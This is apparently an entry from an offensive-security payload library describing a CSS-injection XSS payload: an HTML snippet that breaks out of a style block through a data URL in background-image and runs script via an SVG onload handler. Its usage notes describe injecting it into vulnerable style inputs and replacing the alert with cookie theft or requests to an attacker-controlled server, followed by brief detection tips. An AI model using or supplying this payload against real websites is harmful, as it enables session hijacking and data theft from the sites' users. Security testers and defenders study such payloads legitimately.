---
id: 7f305bf6-8446-4e03-bd36-36d74223202f
type: code
language: HTML
verified: true
created_at: '2023-04-06T03:56:42.156429+00:00'
updated_at: '2023-04-10T20:21:52.347482+00:00'
tags:
  - xss
  - css-injection
  - svg-payload
platforms:
  - Web
validated: true
---

# XSS-CSS-Background-Image-SVG-Payload

## Code

```html
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,</style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

## Description

This HTML snippet demonstrates a malicious CSS injection payload using a data URL in the background-image property. It encodes an SVG element with a JavaScript onload handler that alerts the current document domain when the CSS rule is applied and the image loads. This payload is designed for XSS attacks where user input controls CSS properties, allowing arbitrary JavaScript execution in the victim's browser context.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert(document.domain) | JavaScript code to execute on SVG load; replace with custom payload like document.cookie for data exfiltration | alert('XSS') |

## Usage

Inject this payload into a vulnerable CSS input point, such as a reflected parameter in a stylesheet or dynamic style attribute. When the target page renders the div element, the background-image triggers the SVG load, executing the JavaScript. Modify the alert to perform actions like sending data to an attacker-controlled server via XMLHttpRequest. Used in procedures like [[procedures/XSS-in-CSS-with-Malicious-Background-Image-Injection]] for testing web application vulnerabilities.

## Detection

- Monitor for unusual data URIs in CSS files or inline styles containing base64-encoded SVG with script tags.
- Enable CSP reporting to log violations of style-src or img-src directives.
- Browser developer tools will show the alert or network requests; server-side logs may capture reflected payloads in requests.
- Static analysis tools can flag SVG in CSS contexts as potential XSS vectors.
